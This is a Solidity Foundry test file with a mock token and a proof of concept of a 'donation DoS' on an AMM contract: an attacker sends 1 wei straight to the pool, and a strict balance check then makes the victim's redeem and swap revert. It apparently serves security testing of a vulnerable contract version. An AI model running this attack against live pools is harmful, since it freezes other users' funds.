// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "versions/AMM_v2.sol";
import "versions/lib/IERC20.sol";

contract MockToken is IERC20 {
    string public name;
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 1000000 * 1e18;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Insufficient allowance");
        allowance[from][msg.sender] -= value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }
}

contract DonationDosV2Test is Test {
    AMM amm;
    MockToken token0;
    MockToken token1;

    address attacker = address(0xBAD);
    address victim = address(0x1337);

    function setUp() public {

        token0 = new MockToken("Token 0", "T0");
        token1 = new MockToken("Token 1", "T1");

        amm = new AMM(IERC20(address(token0)), IERC20(address(token1)));

        token0.transfer(victim, 100_000);
        token1.transfer(victim, 100_000);
        token0.transfer(attacker, 10);
        token1.transfer(attacker, 10);
    }

    // donation-dos:
    // If the real token balances of the contract strictly exceed its tracked reserves, a `redeem(liquidity_tokens)` transaction by a valid sender possessing a strictly positive amount of liquidity tokens never reverts.

    // PoC:
    // - Step 1 (setup): The user initializes the pool. The attacker then transfers 1 wei directly to the contract (donation), causing the real balance to decouple from the internal reserves.
    // - Step 2 (attack): The user attempts to redeem their liquidity tokens. The transaction reverts due to strict equality checks (`balance == r0`), permanently locking the funds (DoS).
    function test_donation_dos_attack() public {
        console.log("--- STARTING DONATION DOS ATTACK ON AMM_v2 ---");

        vm.startPrank(victim);
        token0.approve(address(amm), 10_000);
        token1.approve(address(amm), 10_000);
        amm.deposit(10_000, 10_000);
        vm.stopPrank();

        console.log("Victim successfully deposited 10,000 tokens.");
        console.log("AMM cached reserves -> r0:", amm.r0(), "r1:", amm.r1());
        console.log("AMM actual balances -> T0:", token0.balanceOf(address(amm)), "T1:", token1.balanceOf(address(amm)));

        vm.startPrank(attacker);
        console.log("\n[!] Attacker donates 1 wei of T0 directly to the AMM contract...");
        token0.transfer(address(amm), 1);
        vm.stopPrank();

        console.log("AMM cached reserves -> r0:", amm.r0(), "r1:", amm.r1());
        console.log("AMM actual balances -> T0:", token0.balanceOf(address(amm)), "T1:", token1.balanceOf(address(amm)));
        console.log("Notice the mismatch between cached r0 and actual T0 balance!");

        vm.startPrank(victim);
        console.log("\nVictim tries to redeem their 10,000 shares...");

        vm.expectRevert();
        amm.redeem(10_000);
        console.log("[x] Redeem REVERTED! Victim's funds are permanently locked.");

        console.log("\nVictim tries to swap...");
        token0.approve(address(amm), 100);
        vm.expectRevert();
        amm.swap(address(token0), 100, 0);
        console.log("[x] Swap REVERTED! The AMM is completely frozen.");
        vm.stopPrank();

        console.log("\n--- ATTACK SUCCESSFUL ---");
        console.log("A 1-wei donation permanently destroyed the pool.");
    }
}
